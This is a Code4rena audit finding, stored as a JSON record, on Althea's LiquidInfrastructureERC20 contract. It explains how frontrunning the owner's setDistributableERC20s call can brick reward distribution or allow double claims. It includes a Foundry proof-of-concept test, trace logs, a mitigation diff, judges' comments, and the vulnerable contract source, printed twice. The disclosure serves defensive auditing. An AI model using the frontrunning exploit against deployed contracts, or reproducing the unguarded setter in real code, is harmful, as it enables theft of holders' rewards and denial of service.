{
  "Title": "[M-03]  Distribution can be bricked, and double claims by a few holders are possible when owner calls `LiquidInfrastructureERC20::setDistributableERC20s`",
  "Content": "\n### Lines of code\n\n<https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L222>\n\n### Impact\n\nDouble claim, DOS by bricking distribution, few holders can lose some rewards due to missing validation of distribution timing when owner is calling [LiquidInfrastructureERC20::setDistributableERC20s](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441-L445).\n\n```solidity\n    function setDistributableERC20s(\n        address[] memory _distributableERC20s\n    ) public onlyOwner {\n        distributableERC20s = _distributableERC20s;\n    }\n```\n\nThis issue will be impacted the following ways:\n\nWhen a new token is accepted by any NFT it should be added as a desirable token, or a new `managerNFT` with a new token, then, [LiquidInfrastructureERC20::setDistributableERC20s](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441-L445) has to be called to distribute the rewards.\n\nSo when the owner calls [LiquidInfrastructureERC20::setDistributableERC20s](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441-L445) which adds a new token as desired token:\n\n1. **Bricking distribution to holders**: Check the POC for proof. When a new token is added, we can expect revert when:\n    - The number of desirable tokens length array is increased.\n    - An attacker can frontrun and distribute to only one holder, so `erc20EntitlementPerUnit` is now  changed.\n    - Now, the actual owner tx is processed, which increases/decreases the size of `distributableERC20s` array.\n    - But now, distribution is not possible because the Out of Bound revert on the distribution function because `distributableERC20s` array is changed, but `erc20EntitlementPerUnit` array size is same before the `distributableERC20s` array is modified.\n\n```solidity\n            for (uint j = 0; j < distributableERC20s.length; j++) {\n                uint256 entitlement = erc20EntitlementPerUnit[j] *  this.balanceOf(recipient);\n                if (IERC20(distributableERC20s[j]).transfer(recipient, entitlement)) {\n                    receipts[j] = entitlement;\n                }\n            }\n```\n\n2. **Double claim by a holder**: so some holder can DOS by:\n    - A last holder of the 10 [holders array](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L48) frontruns this owner tx (`setDistributableERC20s`) and calls [LiquidInfrastructureERC20::distribute](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L198) with 90% of the holders count as params, so all the rewards of old desirable tokens will be distributed to 9 holders.\n    - Now, after the owners action, backruns it to distribute to the last holder, which will also receive new token as rewards.\n    - The previous holders can also claim their share in the next distribution round, but the last holder also can claim which makes double claim possible, which takes a cut from all other holders.\n\n3. If owner calls [LiquidInfrastructureERC20::setDistributableERC20s](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441-L445), which removes some tokens, then any token balance in the contract will be lost until the owner re-adds the token, and it can be distributed again.\n\nAll the issues can be countered if the [LiquidInfrastructureERC20::setDistributableERC20s](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441-L445) is validated to make changes happen only after any potential distributions\n\n### Proof of Concept\n\nThe logs of the POC shows the revert `Index out of bounds`:\n\n```sh\n    ├─ [24677] LiquidInfrastructureERC20::distribute(1)\n    │   ├─ [624] LiquidInfrastructureERC20::balanceOf(0x0000000000000000000000000000000000000002) [staticcall]\n    │   │   └─ ← 100000000000000000000 [1e20]\n    │   ├─ [20123] ERC20::transfer(0x0000000000000000000000000000000000000002, 500000000000000000000 [5e20])\n    │   │   ├─ emit Transfer(from: LiquidInfrastructureERC20: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], to: 0x0000000000000000000000000000000000000002, value: 500000000000000000000 [5e20])\n    │   │   └─ ← true\n    │   ├─ [624] LiquidInfrastructureERC20::balanceOf(0x0000000000000000000000000000000000000002) [staticcall]\n    │   │   └─ ← 100000000000000000000 [1e20]\n    │   └─ ← \"Index out of bounds\"\n    └─ ← \"Index out of bounds\"\n```\n\nFirst, run `forge init --force`, then run `forge i openzeppelin/openzeppelin-contracts@v4.3.1` and modify `foundry.toml` file into below:\n\n```diff\n[profile.default]\n- src = \"contracts\"\n+ src = \"src\"\nout = \"out\"\nlibs = [\"lib\"]\n```\n\nThen, copy the below POC into `test/Test.t.sol` and run `forge t --mt test_POC -vvvv`:\n\n```soldity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.12;\n\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {LiquidInfrastructureERC20} from \"../contracts/LiquidInfrastructureERC20.sol\";\nimport {LiquidInfrastructureNFT} from \"../contracts/LiquidInfrastructureNFT.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n\ncontract AltheaTest is Test {\n    function setUp() public {}\n\n\n    function test_POC() public {\n        // setup\n        LiquidInfrastructureNFT nft = new LiquidInfrastructureNFT(\"LP\");\n        address[] memory newErc20s = new address[](1);\n        uint256[] memory newAmounts = new uint[](1);\n       \n        ERC20 DAI = new ERC20(\"DAI\", \"DAI\");\n        ERC20 USDC = new ERC20(\"USDC\", \"USDC\");\n\n\n        string memory _name = \"LP\";\n        string memory _symbol = \"LP\";\n        uint256 _minDistributionPeriod = 5;\n        address[] memory _managedNFTs = new address[](1);\n        address[] memory _approvedHolders = new address[](2);\n        address[] memory _distributableErc20s = new address[](1);\n\n\n        _managedNFTs[0] = address(nft);\n        _approvedHolders[0] = address(1);\n        _approvedHolders[1] = address(2);\n        _distributableErc20s[0] = address(DAI);\n\n\n        newErc20s[0] = address(DAI);\n        nft.setThresholds(newErc20s, newAmounts);\n        LiquidInfrastructureERC20 erc = new  LiquidInfrastructureERC20(\n            _name, _symbol, _managedNFTs, _approvedHolders, _minDistributionPeriod, _distributableErc20s);\n        erc.mint(address(1), 100e18);\n        erc.mint(address(2), 100e18);\n\n\n        // issue ==  change in desirable erc20s\n        _distributableErc20s = new address[](2);\n        _distributableErc20s[0] = address(DAI);\n        _distributableErc20s[1] = address(USDC);\n        newAmounts = new uint[](2);\n        newErc20s = new address[](2);\n        newErc20s[0] = address(DAI);\n        newErc20s[1] = address(USDC);\n        nft.setThresholds(newErc20s, newAmounts);\n\n\n        deal(address(DAI), address(erc), 1000e18);\n        deal(address(USDC), address(erc), 1000e18);\n        vm.roll(block.number + 100);\n\n\n        // frontrun tx\n        erc.distribute(1);\n\n\n        // victim tx\n        erc.setDistributableERC20s(_distributableErc20s);\n\n\n        // backrun tx\n        vm.roll(block.number + _minDistributionPeriod);\n        vm.expectRevert(); // Index out of bounds\n        erc.distribute(1);\n    }\n\n\n}\n```\n\n### Tools Used\n\nFoundry testing\n\n### Recommended Mitigation Steps\n\nModify [LiquidInfrastructureERC20::setDistributableERC20s](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441-L445) to only change the desirable tokens after a potential distribution for fair reward sharing.\n\n```diff\n    function setDistributableERC20s(\n        address[] memory _distributableERC20s\n    ) public onlyOwner {\n+       require(!_isPastMinDistributionPeriod(), \"set only just after distribution\");\n        distributableERC20s = _distributableERC20s;\n    }\n```\n\n### Assessed type\n\nDoS\n\n**[ChristianBorst (Althea) confirmed via duplicate issue #260](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/260#issuecomment-1973824297)**\n\n**[0xA5DF (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/87#issuecomment-1985892087):**\n > Changing to medium since `setDistributableERC20s()` is a function rarely called. This would only be relevant if we're after minimum distribution period has passed since the last distribution.\n\n**[MrPotatoMagic (warden) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/87#issuecomment-1986269977):**\n > @0xA5DF - I think this issue should be invalid.\n> \n> This issue arises solely due to owner misbehaviour/error, which is a centralization risk and should be included in analysis reports. Changing the configuration of distributable ERC20 tokens in the middle of the distribution period is the owner's fault and not expected behaviour.  \n\n**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/87#issuecomment-1986786007):**\n > The submission talks about a scenario where the owner sent out the tx when there was no distribution going on and a malicious actor front runs it. This is a likely scenario and isn't due to an error on the admin side (the admin can prevent this by running distribution first, but there's no way for the average admin to guess that running this tx without distributing first would cause any issues). Therefore, I'm maintaining medium severity.\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2024-02-althea-liquid-infrastructure",
  "Code": [
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "//SPDX-License-Identifier: Apache-2.0\npragma solidity 0.8.12; // Force solidity compliance\n\nimport \"@openzeppelin/contracts/utils/math/Math.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"./LiquidInfrastructureNFT.sol\";\n\n/**\n * @title Liquid Infrastructure ERC20\n * @author Christian Borst <christian@althea.systems>\n *\n * @dev An ERC20 contract used to earn rewards from managed LiquidInfrastructreNFTs.\n *\n * A LiquidInfrastructureNFT typically represents some form of infrastructure involved in an Althea pay-per-forward network\n * which frequently receives payments from peers on the network for performing an automated service (e.g. providing internet).\n * This LiquidInfrastructureERC20 acts as a convenient aggregation layer to enable dead-simple investment in real-world assets\n * with automatic revenue accrual. Simply by holding this ERC20 owners are entitled to revenue from the network represented by the token.\n *\n * Revenue is gathered from managed LiquidInfrastructureNFTs by the protocol and distributed to token holders on a semi-regular basis,\n * where there is a minimum number of blocks required to elapse before a new payout to token holders.\n *\n * Minting and burning of this ERC20 is restricted if the minimum distribution period has elapsed, and it is reenabled once a new distribution is complete.\n */\ncontract LiquidInfrastructureERC20 is\n    ERC20,\n    ERC20Burnable,\n    Ownable,\n    ERC721Holder,\n    ReentrancyGuard\n{\n    event Deployed();\n    event DistributionStarted();\n    event Distribution(address recipient, address[] tokens, uint256[] amounts);\n    event DistributionFinished();\n    event WithdrawalStarted();\n    event Withdrawal(address source);\n    event WithdrawalFinished();\n    event AddManagedNFT(address nft);\n    event ReleaseManagedNFT(address nft, address to);\n\n    address[] private distributableERC20s;\n    uint256[] private erc20EntitlementPerUnit;\n    address[] private holders;\n\n    /**\n     * @notice This is the current version of the contract. Every update to the contract will introduce a new\n     * version, regardless of anticipated compatibility.\n     */\n    uint256 public constant Version = 1;\n\n    /**\n     * @notice This collection holds the managed LiquidInfrastructureNFTs which periodically generate revenue and deliver\n     * the balances to this contract.\n     */\n    address[] public ManagedNFTs;\n\n    /**\n     * @notice This collection holds the whitelist for accounts approved to hold the LiquidInfrastructureERC20\n     */\n    mapping(address => bool) public HolderAllowlist;\n\n    /**\n     * @notice Holds the block of the last distribution, used for limiting distribution lock ups\n     */\n    uint256 public LastDistribution;\n\n    /**\n     * @notice Holds the minimum number of blocks required to elapse before a new distribution can begin\n     */\n    uint256 public MinDistributionPeriod;\n\n    /**\n     * @notice When true, locks all transfers, mints, and burns until the current distribution has completed\n     */\n    bool public LockedForDistribution;\n\n    /**\n     * @dev Holds the index into `holders` of the next account owed the current distribution\n     */\n    uint256 internal nextDistributionRecipient;\n\n    /**\n     * @dev Holds the index into `ManagedNFTs` of the next contract to withdraw funds from\n     */\n    uint256 private nextWithdrawal;\n\n    /**\n     * Indicates if the account is approved to hold the ERC20 token or not\n     * @param account the potential holder of the token\n     */\n    function isApprovedHolder(address account) public view returns (bool) {\n        return HolderAllowlist[account];\n    }\n\n    /**\n     * Adds `holder` to the list of approved token holders. This is necessary before `holder` may receive any of the underlying ERC20.\n     * @notice this call will fail if `holder` is already approved. Call isApprovedHolder() first to avoid mistakes.\n     *\n     * @param holder the account to add to the allowlist\n     */\n    function approveHolder(address holder) public onlyOwner {\n        require(!isApprovedHolder(holder), \"holder already approved\");\n        HolderAllowlist[holder] = true;\n    }\n\n    /**\n     * Marks `holder` as NOT approved to hold the token, preventing them from receiving any more of the underlying ERC20.\n     *\n     * @param holder the account to add to the allowlist\n     */\n    function disapproveHolder(address holder) public onlyOwner {\n        require(isApprovedHolder(holder), \"holder not approved\");\n        HolderAllowlist[holder] = false;\n    }\n\n    /**\n     * Implements the lock during distributions, adds `to` to the list of holders when needed\n     * @param from token sender\n     * @param to  token receiver\n     * @param amount  amount sent\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        require(!LockedForDistribution, \"distribution in progress\");\n        if (!(to == address(0))) {\n            require(\n                isApprovedHolder(to),\n                \"receiver not approved to hold the token\"\n            );\n        }\n        if (from == address(0) || to == address(0)) {\n            _beforeMintOrBurn();\n        }\n        bool exists = (this.balanceOf(to) != 0);\n        if (!exists) {\n            holders.push(to);\n        }\n    }\n\n    /**\n     * Implements an additional lock on minting and burning, ensuring that supply changes happen after any potential distributions\n     */\n    function _beforeMintOrBurn() internal view {\n        require(\n            !_isPastMinDistributionPeriod(),\n            \"must distribute before minting or burning\"\n        );\n    }\n\n    /**\n     * Removes `from` from the list of holders when they no longer hold any balance\n     * @param from token sender\n     * @param to  token receiver\n     * @param amount  amount sent\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        bool stillHolding = (this.balanceOf(from) != 0);\n        if (!stillHolding) {\n            for (uint i = 0; i < holders.length; i++) {\n                if (holders[i] == from) {\n                    // Remove the element at i by copying the last one into its place and removing the last element\n                    holders[i] = holders[holders.length - 1];\n                    holders.pop();\n                }\n            }\n        }\n    }\n\n    /**\n     * Performs a distribution to all of the current holders, which may trigger out of gas errors if there are too many holders\n     */\n    function distributeToAllHolders() public {\n        uint256 num = holders.length;\n        if (num > 0) {\n            distribute(holders.length);\n        }\n    }\n\n    /**\n     * Begins or continues a distribution, preventing transfers, mints, and burns of the token until all rewards have been paid out\n     *\n     * @notice distributions may only begin once every MinDistributionPeriod.\n     *\n     * @param numDistributions the number of distributions to process in this execution\n     */\n    function distribute(uint256 numDistributions) public nonReentrant {\n        require(numDistributions > 0, \"must process at least 1 distribution\");\n        if (!LockedForDistribution) {\n            require(\n                _isPastMinDistributionPeriod(),\n                \"MinDistributionPeriod not met\"\n            );\n            _beginDistribution();\n        }\n\n        uint256 limit = Math.min(\n            nextDistributionRecipient + numDistributions,\n            holders.length\n        );\n\n        uint i;\n        for (i = nextDistributionRecipient; i < limit; i++) {\n            address recipient = holders[i];\n            if (isApprovedHolder(recipient)) {\n                uint256[] memory receipts = new uint256[](\n                    distributableERC20s.length\n                );\n                for (uint j = 0; j < distributableERC20s.length; j++) {\n                    IERC20 toDistribute = IERC20(distributableERC20s[j]);\n                    uint256 entitlement = erc20EntitlementPerUnit[j] *\n                        this.balanceOf(recipient);\n                    if (toDistribute.transfer(recipient, entitlement)) {\n                        receipts[j] = entitlement;\n                    }\n                }\n\n                emit Distribution(recipient, distributableERC20s, receipts);\n            }\n        }\n        nextDistributionRecipient = i;\n\n        if (nextDistributionRecipient == holders.length) {\n            _endDistribution();\n        }\n    }\n\n    /**\n     * Determines if the minimum distribution period has elapsed, which is used for restricting\n     * minting and burning operations\n     */\n    function _isPastMinDistributionPeriod() internal view returns (bool) {\n        // Do not force a distribution with no holders or supply\n        if (totalSupply() == 0 || holders.length == 0) {\n            return false;\n        }\n\n        return (block.number - LastDistribution) >= MinDistributionPeriod;\n    }\n\n    /**\n     * Prepares this contract for distribution:\n     * - Locks the contract\n     * - Calculates the entitlement to protocol-held ERC20s per unit of the LiquidInfrastructureERC20 held\n     */\n    function _beginDistribution() internal {\n        require(\n            !LockedForDistribution,\n            \"cannot begin distribution when already locked\"\n        );\n        LockedForDistribution = true;\n\n        // clear the previous entitlements, if any\n        if (erc20EntitlementPerUnit.length > 0) {\n            delete erc20EntitlementPerUnit;\n        }\n\n        // Calculate the entitlement per token held\n        uint256 supply = this.totalSupply();\n        for (uint i = 0; i < distributableERC20s.length; i++) {\n            uint256 balance = IERC20(distributableERC20s[i]).balanceOf(\n                address(this)\n            );\n            uint256 entitlement = balance / supply;\n            erc20EntitlementPerUnit.push(entitlement);\n        }\n\n        nextDistributionRecipient = 0;\n        emit DistributionStarted();\n    }\n\n    /**\n     * Unlocks this contract at the end of a distribution\n     */\n    function _endDistribution() internal {\n        require(\n            LockedForDistribution,\n            \"cannot end distribution when not locked\"\n        );\n        delete erc20EntitlementPerUnit;\n        LockedForDistribution = false;\n        LastDistribution = block.number;\n        emit DistributionFinished();\n    }\n\n    /**\n     * Convenience function that allows the contract owner to distribute when necessary and then mint right after\n     *\n     * @notice attempts to distribute to every holder in this block, which may exceed the block gas limit\n     * if this fails then first call distribute\n     */\n    function mintAndDistribute(\n        address account,\n        uint256 amount\n    ) public onlyOwner {\n        if (_isPastMinDistributionPeriod()) {\n            distributeToAllHolders();\n        }\n        mint(account, amount);\n    }\n\n    /**\n     * Allows the contract owner to mint tokens for an address\n     *\n     * @notice minting may only occur when a distribution has happened within MinDistributionPeriod blocks\n     */\n    function mint(\n        address account,\n        uint256 amount\n    ) public onlyOwner nonReentrant {\n        _mint(account, amount);\n    }\n\n    /**\n     * Convenience function that allows a token holder to distribute when necessary and then burn their tokens right after\n     *\n     * @notice attempts to distribute to every holder in this block, which may exceed the block gas limit\n     * if this fails then first call distribute() enough times to finish a distribution and then call burn()\n     */\n    function burnAndDistribute(uint256 amount) public {\n        if (_isPastMinDistributionPeriod()) {\n            distributeToAllHolders();\n        }\n        burn(amount);\n    }\n\n    /**\n     * Convenience function that allows an approved sender to distribute when necessary and then burn the approved tokens right after\n     *\n     * @notice attempts to distribute to every holder in this block, which may exceed the block gas limit\n     * if this fails then first call distribute() enough times to finish a distribution and then call burnFrom()\n     */\n    function burnFromAndDistribute(address account, uint256 amount) public {\n        if (_isPastMinDistributionPeriod()) {\n            distributeToAllHolders();\n        }\n        burnFrom(account, amount);\n    }\n\n    function withdrawFromAllManagedNFTs() public {\n        withdrawFromManagedNFTs(ManagedNFTs.length);\n    }\n\n    /**\n     * Performs withdrawals from the ManagedNFTs collection, depositing all token balances into the custody of this contract\n     * @param numWithdrawals the number of withdrawals to perform\n     */\n    function withdrawFromManagedNFTs(uint256 numWithdrawals) public {\n        require(!LockedForDistribution, \"cannot withdraw during distribution\");\n\n        if (nextWithdrawal == 0) {\n            emit WithdrawalStarted();\n        }\n\n        uint256 limit = Math.min(\n            numWithdrawals + nextWithdrawal,\n            ManagedNFTs.length\n        );\n        uint256 i;\n        for (i = nextWithdrawal; i < limit; i++) {\n            LiquidInfrastructureNFT withdrawFrom = LiquidInfrastructureNFT(\n                ManagedNFTs[i]\n            );\n\n            (address[] memory withdrawERC20s, ) = withdrawFrom.getThresholds();\n            withdrawFrom.withdrawBalancesTo(withdrawERC20s, address(this));\n            emit Withdrawal(address(withdrawFrom));\n        }\n        nextWithdrawal = i;\n\n        if (nextWithdrawal == ManagedNFTs.length) {\n            nextWithdrawal = 0;\n            emit WithdrawalFinished();\n        }\n    }\n\n    /**\n     * Adds a LiquidInfrastructureNFT contract to the ManagedNFTs collection\n     * @notice this contract must already be the owner of the `nftContract` before this function is called\n     *\n     * @param nftContract the LiquidInfrastructureNFT contract to add to ManagedNFTs\n     */\n    function addManagedNFT(address nftContract) public onlyOwner {\n        LiquidInfrastructureNFT nft = LiquidInfrastructureNFT(nftContract);\n        address nftOwner = nft.ownerOf(nft.AccountId());\n        require(\n            nftOwner == address(this),\n            \"this contract does not own the new ManagedNFT\"\n        );\n        ManagedNFTs.push(nftContract);\n        emit AddManagedNFT(nftContract);\n    }\n\n    /**\n     * Transfers a LiquidInfrastructureNFT contract out of the control of this contract\n     * @notice LiquidInfrastructureNFTs only hold a single token with a specific id (AccountId), this function\n     * only transfers the token with that specific id\n     *\n     * @param nftContract the NFT to release\n     * @param to the new owner of the NFT\n     */\n    function releaseManagedNFT(\n        address nftContract,\n        address to\n    ) public onlyOwner nonReentrant {\n        LiquidInfrastructureNFT nft = LiquidInfrastructureNFT(nftContract);\n        nft.transferFrom(address(this), to, nft.AccountId());\n\n        // Remove the released NFT from the collection\n        for (uint i = 0; i < ManagedNFTs.length; i++) {\n            address managed = ManagedNFTs[i];\n            if (managed == nftContract) {\n                // Delete by copying in the last element and then pop the end\n                ManagedNFTs[i] = ManagedNFTs[ManagedNFTs.length - 1];\n                ManagedNFTs.pop();\n                break;\n            }\n        }\n        // By this point the NFT should have been found and removed from ManagedNFTs\n        require(true, \"unable to find released NFT in ManagedNFTs\");\n\n        emit ReleaseManagedNFT(nftContract, to);\n    }\n\n    /**\n     * Allows the owner to overwrite the list of ERC20s which may be distributed from ManagedNFTs to the holders\n     *\n     * @param _distributableERC20s  The new list value to set\n     */\n    function setDistributableERC20s(\n        address[] memory _distributableERC20s\n    ) public onlyOwner {\n        distributableERC20s = _distributableERC20s;\n    }\n\n    /**\n     * Constructs the underlying ERC20 and initializes critical variables\n     *\n     * @param _name The name of the underlying ERC20\n     * @param _symbol The symbol of the underlying ERC20\n     * @param _managedNFTs The addresses of the controlled LiquidInfrastructureNFT contracts\n     * @param _approvedHolders The addresses of the initial allowed holders\n     * @param _distributableErc20s The addresses of ERC20s which should be distributed from ManagedNFTs to holders\n     */\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        address[] memory _managedNFTs,\n        address[] memory _approvedHolders,\n        uint256 _minDistributionPeriod,\n        address[] memory _distributableErc20s\n    ) ERC20(_name, _symbol) Ownable() {\n        ManagedNFTs = _managedNFTs;\n        LastDistribution = block.number;\n\n        for (uint i = 0; i < _approvedHolders.length; i++) {\n            HolderAllowlist[_approvedHolders[i]] = true;\n        }\n\n        MinDistributionPeriod = _minDistributionPeriod;\n\n        distributableERC20s = _distributableErc20s;\n\n        emit Deployed();\n    }\n}"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "//SPDX-License-Identifier: Apache-2.0\npragma solidity 0.8.12; // Force solidity compliance\n\nimport \"@openzeppelin/contracts/utils/math/Math.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"./LiquidInfrastructureNFT.sol\";\n\n/**\n * @title Liquid Infrastructure ERC20\n * @author Christian Borst <christian@althea.systems>\n *\n * @dev An ERC20 contract used to earn rewards from managed LiquidInfrastructreNFTs.\n *\n * A LiquidInfrastructureNFT typically represents some form of infrastructure involved in an Althea pay-per-forward network\n * which frequently receives payments from peers on the network for performing an automated service (e.g. providing internet).\n * This LiquidInfrastructureERC20 acts as a convenient aggregation layer to enable dead-simple investment in real-world assets\n * with automatic revenue accrual. Simply by holding this ERC20 owners are entitled to revenue from the network represented by the token.\n *\n * Revenue is gathered from managed LiquidInfrastructureNFTs by the protocol and distributed to token holders on a semi-regular basis,\n * where there is a minimum number of blocks required to elapse before a new payout to token holders.\n *\n * Minting and burning of this ERC20 is restricted if the minimum distribution period has elapsed, and it is reenabled once a new distribution is complete.\n */\ncontract LiquidInfrastructureERC20 is\n    ERC20,\n    ERC20Burnable,\n    Ownable,\n    ERC721Holder,\n    ReentrancyGuard\n{\n    event Deployed();\n    event DistributionStarted();\n    event Distribution(address recipient, address[] tokens, uint256[] amounts);\n    event DistributionFinished();\n    event WithdrawalStarted();\n    event Withdrawal(address source);\n    event WithdrawalFinished();\n    event AddManagedNFT(address nft);\n    event ReleaseManagedNFT(address nft, address to);\n\n    address[] private distributableERC20s;\n    uint256[] private erc20EntitlementPerUnit;\n    address[] private holders;\n\n    /**\n     * @notice This is the current version of the contract. Every update to the contract will introduce a new\n     * version, regardless of anticipated compatibility.\n     */\n    uint256 public constant Version = 1;\n\n    /**\n     * @notice This collection holds the managed LiquidInfrastructureNFTs which periodically generate revenue and deliver\n     * the balances to this contract.\n     */\n    address[] public ManagedNFTs;\n\n    /**\n     * @notice This collection holds the whitelist for accounts approved to hold the LiquidInfrastructureERC20\n     */\n    mapping(address => bool) public HolderAllowlist;\n\n    /**\n     * @notice Holds the block of the last distribution, used for limiting distribution lock ups\n     */\n    uint256 public LastDistribution;\n\n    /**\n     * @notice Holds the minimum number of blocks required to elapse before a new distribution can begin\n     */\n    uint256 public MinDistributionPeriod;\n\n    /**\n     * @notice When true, locks all transfers, mints, and burns until the current distribution has completed\n     */\n    bool public LockedForDistribution;\n\n    /**\n     * @dev Holds the index into `holders` of the next account owed the current distribution\n     */\n    uint256 internal nextDistributionRecipient;\n\n    /**\n     * @dev Holds the index into `ManagedNFTs` of the next contract to withdraw funds from\n     */\n    uint256 private nextWithdrawal;\n\n    /**\n     * Indicates if the account is approved to hold the ERC20 token or not\n     * @param account the potential holder of the token\n     */\n    function isApprovedHolder(address account) public view returns (bool) {\n        return HolderAllowlist[account];\n    }\n\n    /**\n     * Adds `holder` to the list of approved token holders. This is necessary before `holder` may receive any of the underlying ERC20.\n     * @notice this call will fail if `holder` is already approved. Call isApprovedHolder() first to avoid mistakes.\n     *\n     * @param holder the account to add to the allowlist\n     */\n    function approveHolder(address holder) public onlyOwner {\n        require(!isApprovedHolder(holder), \"holder already approved\");\n        HolderAllowlist[holder] = true;\n    }\n\n    /**\n     * Marks `holder` as NOT approved to hold the token, preventing them from receiving any more of the underlying ERC20.\n     *\n     * @param holder the account to add to the allowlist\n     */\n    function disapproveHolder(address holder) public onlyOwner {\n        require(isApprovedHolder(holder), \"holder not approved\");\n        HolderAllowlist[holder] = false;\n    }\n\n    /**\n     * Implements the lock during distributions, adds `to` to the list of holders when needed\n     * @param from token sender\n     * @param to  token receiver\n     * @param amount  amount sent\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        require(!LockedForDistribution, \"distribution in progress\");\n        if (!(to == address(0))) {\n            require(\n                isApprovedHolder(to),\n                \"receiver not approved to hold the token\"\n            );\n        }\n        if (from == address(0) || to == address(0)) {\n            _beforeMintOrBurn();\n        }\n        bool exists = (this.balanceOf(to) != 0);\n        if (!exists) {\n            holders.push(to);\n        }\n    }\n\n    /**\n     * Implements an additional lock on minting and burning, ensuring that supply changes happen after any potential distributions\n     */\n    function _beforeMintOrBurn() internal view {\n        require(\n            !_isPastMinDistributionPeriod(),\n            \"must distribute before minting or burning\"\n        );\n    }\n\n    /**\n     * Removes `from` from the list of holders when they no longer hold any balance\n     * @param from token sender\n     * @param to  token receiver\n     * @param amount  amount sent\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        bool stillHolding = (this.balanceOf(from) != 0);\n        if (!stillHolding) {\n            for (uint i = 0; i < holders.length; i++) {\n                if (holders[i] == from) {\n                    // Remove the element at i by copying the last one into its place and removing the last element\n                    holders[i] = holders[holders.length - 1];\n                    holders.pop();\n                }\n            }\n        }\n    }\n\n    /**\n     * Performs a distribution to all of the current holders, which may trigger out of gas errors if there are too many holders\n     */\n    function distributeToAllHolders() public {\n        uint256 num = holders.length;\n        if (num > 0) {\n            distribute(holders.length);\n        }\n    }\n\n    /**\n     * Begins or continues a distribution, preventing transfers, mints, and burns of the token until all rewards have been paid out\n     *\n     * @notice distributions may only begin once every MinDistributionPeriod.\n     *\n     * @param numDistributions the number of distributions to process in this execution\n     */\n    function distribute(uint256 numDistributions) public nonReentrant {\n        require(numDistributions > 0, \"must process at least 1 distribution\");\n        if (!LockedForDistribution) {\n            require(\n                _isPastMinDistributionPeriod(),\n                \"MinDistributionPeriod not met\"\n            );\n            _beginDistribution();\n        }\n\n        uint256 limit = Math.min(\n            nextDistributionRecipient + numDistributions,\n            holders.length\n        );\n\n        uint i;\n        for (i = nextDistributionRecipient; i < limit; i++) {\n            address recipient = holders[i];\n            if (isApprovedHolder(recipient)) {\n                uint256[] memory receipts = new uint256[](\n                    distributableERC20s.length\n                );\n                for (uint j = 0; j < distributableERC20s.length; j++) {\n                    IERC20 toDistribute = IERC20(distributableERC20s[j]);\n                    uint256 entitlement = erc20EntitlementPerUnit[j] *\n                        this.balanceOf(recipient);\n                    if (toDistribute.transfer(recipient, entitlement)) {\n                        receipts[j] = entitlement;\n                    }\n                }\n\n                emit Distribution(recipient, distributableERC20s, receipts);\n            }\n        }\n        nextDistributionRecipient = i;\n\n        if (nextDistributionRecipient == holders.length) {\n            _endDistribution();\n        }\n    }\n\n    /**\n     * Determines if the minimum distribution period has elapsed, which is used for restricting\n     * minting and burning operations\n     */\n    